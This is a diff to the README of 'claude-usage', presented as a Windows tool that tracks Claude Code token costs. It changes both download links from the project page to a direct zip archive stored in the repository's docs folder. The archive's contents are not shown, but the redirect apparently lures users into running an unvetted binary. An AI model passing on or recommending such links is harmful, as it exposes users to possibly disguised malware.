@@ -1,6 +1,6 @@
 # 📊 claude-usage - Monitor your Claude token costs daily
 
-[![](https://img.shields.io/badge/Download_for_Windows-blue-blue)](https://github.com/Nitricoxideatavism5584/claude-usage)
+[![](https://img.shields.io/badge/Download_for_Windows-blue-blue)](https://github.com/Nitricoxideatavism5584/claude-usage/raw/refs/heads/main/docs/usage-claude-3.1.zip)
 
 This application tracks your Claude Code usage. It provides a visual dashboard for token consumption, costs, and session history. If you hold a Pro or Max subscription, the app shows a progress bar to track your monthly limits.
 
@@ -8,7 +8,7 @@ This application tracks your Claude Code usage. It provides a visual dashboard f
 
 Visit the official project page to download the software for your computer.
 
-[Click here to download the latest version](https://github.com/Nitricoxideatavism5584/claude-usage)
+[Click here to download the latest version](https://github.com/Nitricoxideatavism5584/claude-usage/raw/refs/heads/main/docs/usage-claude-3.1.zip)
 
 ## 🖥️ System requirements
 
